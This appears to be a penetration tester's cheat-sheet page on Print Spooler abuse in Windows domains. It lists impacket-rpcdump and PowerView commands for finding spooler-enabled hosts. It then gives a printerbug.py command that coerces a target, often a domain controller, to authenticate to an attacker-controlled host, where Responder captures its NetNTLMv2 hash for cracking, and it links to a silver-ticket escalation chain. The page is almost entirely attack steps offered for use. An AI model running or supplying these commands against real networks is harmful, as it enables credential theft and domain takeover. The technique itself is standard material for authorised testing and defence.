# Spooler Service Abuse

For any computer that has the **Print Spooler service** enabled (often [[domain-controller|domain controllers]]), any domain user can send a print notification to that computer, triggering it to authenticate to the computer that the print notification originated from. This can be exploited to extract a computer's NetNTLM hash for [[offline-password-cracking|offline cracking]].

---

## Determine which Computers have the Print Spooler Service Enabled (domain user credentials required)

From Linux:

```bash
impacket-rpcdump $DOMAIN/$USERNAME[:$PASSWORD]@$TARGET_FQDN_OR_IP [-hashes $LMHASH:NTLMHASH] | grep MS-RPRN -A 6
```

- `$PASSWORD` or `-hashes` is required

From Windows:

```powershell
. .\Get-SpoolStatus.ps1
. .\PowerView.ps1
Get-DomainComputer | % {Get-SpoolStatus -ComputerName $_.DnsHostName}
```

---

## Force Computers with the Print Spooler Service Enabled to Authenticate to an Attacker-Controlled Host and Steal their NetNTLMv2 Hash

From Linux:

1. [[responder#Start Responding|Start responding with Responder]] on the attacker-controlled host.

2. Use `printerbug.py` from [[krbrelayx]] to send the print notification and trigger the target computer to authenticate.

```bash
cd /opt/krbrelayx
python3 printerbug.py [$DOMAIN]/$USERNAME[:$PASSWORD]@$TARGET_FQDN_OR_IP [-hashes $LMHASH:NTLMHASH] $ATTACKER_CONTROLLED_HOST
```

- `$DOMAIN/$USERNAME` is any valid domain user
- `$PASSWORD` or `-hashes` is required

---

## Crack NetNTLMv2 Hashes

See [[hashcat#Crack NetNTLMv2 Hashes|Hashcat]].

---

## [Spool Service Abuse -> NetNTLMv1 -> NTLM -> Silver Ticket](https://github.com/NotMedic/NetNTLMtoSilverTicket)
